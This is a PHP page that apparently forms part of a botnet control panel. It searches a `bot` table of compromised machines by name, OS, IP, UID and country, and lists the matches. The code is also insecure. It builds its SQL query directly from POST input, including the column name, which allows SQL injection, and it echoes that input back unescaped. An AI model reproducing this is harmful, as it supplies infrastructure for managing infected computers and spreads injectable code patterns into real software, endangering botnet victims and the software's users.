<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="stylesheet" href="css/screen.css" type="text/css" media="screen">
  <link rel="stylesheet" href="css/buttons.css" type="text/css" media="screen">
</head>
  <?php
include("config.php");
include("auth.php");
if (isset($_POST['name'])){
$srch=$_POST['srch'];
$name=$_POST['name'];
$country=$_POST['country'];
echo $country;
echo $name;
echo  $srch;

if (! $connect) die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT `name` , `os` , `ip` , `uid` , `contry` FROM  `bot` WHERE  `$srch` LIKE  '$name' AND `contry` LIKE '%$country%'" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);
print "<center>There are $num_rows <b>Bot's</b> found.<br>";
while ($get_info = mysql_fetch_row($result)){
echo "<table border='1'>
<tr>
<th>Name</th>
<th>OS</th>
<th>IP</th>
<th>UID</th>
<th>Contry</th></tr>";
echo "<tr>";
foreach ($get_info as $field)
print "<td> $field | </td>";
echo "<b><h4><center>|||||||||||||||||||||||||||||||||||||||</center></h4></b>";
echo "</tr>";
}
echo "</table>";
}
mysql_close($connect);
?>